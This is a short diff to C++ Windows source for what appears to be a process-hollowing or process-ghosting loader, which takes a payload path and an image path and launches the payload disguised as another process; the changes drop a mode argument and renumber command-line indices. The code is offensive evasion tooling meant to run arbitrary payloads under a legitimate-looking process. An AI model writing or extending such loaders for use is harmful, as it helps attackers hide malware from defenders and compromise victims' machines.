@@ -4,8 +4,8 @@
 #include <iostream>
 
 #define EXIT_IF_HANDLE_INVALID( x ) if( x == INVALID_HANDLE_VALUE ) \
-									{	return EXIT_FAILURE;		\
-									}								\
+				    {	return EXIT_FAILURE;        \
+				    }				    \
 
 BOOL CreateHollowedProcess(_In_ LPWSTR CommandLine, _Inout_ PPROCESS_INFORMATION* HollowedProcess)
 {
@@ -28,13 +28,13 @@ BOOL CreateHollowedProcess(_In_ LPWSTR CommandLine, _Inout_ PPROCESS_INFORMATION
 
 INT wmain(INT argc, PWCHAR argv[])
 {	
-	if (argc < 3)
+	if (argc < 2)
 	{
-		std::wcerr << "\nUsage: " << argv[0] << " <Ghostly\\Tiburon> <Path to payload> <Path to image> <Arg1>...<ArgN> \n";
+		std::wcerr << "\nUsage: " << argv[0] << "<Path to payload> <Path to image> <Arg1>...<ArgN> \n";
 	}
 
 	std::wstring CommandLine;
-	for (INT i = 3; i < argc; i++)
+	for (INT i = 2; i < argc; i++)
 	{
 		CommandLine += argv[i];
 		CommandLine += L" ";
@@ -43,7 +43,7 @@ INT wmain(INT argc, PWCHAR argv[])
 	HANDLE TempFile{ CreateTempFile() };
 	EXIT_IF_HANDLE_INVALID(TempFile)
 
-	HANDLE PayloadFile{ CreateFileW(argv[2], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)};
+	HANDLE PayloadFile{ CreateFileW(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)};
 	EXIT_IF_HANDLE_INVALID(PayloadFile)
 
 	DWORD  PayloadSize{};
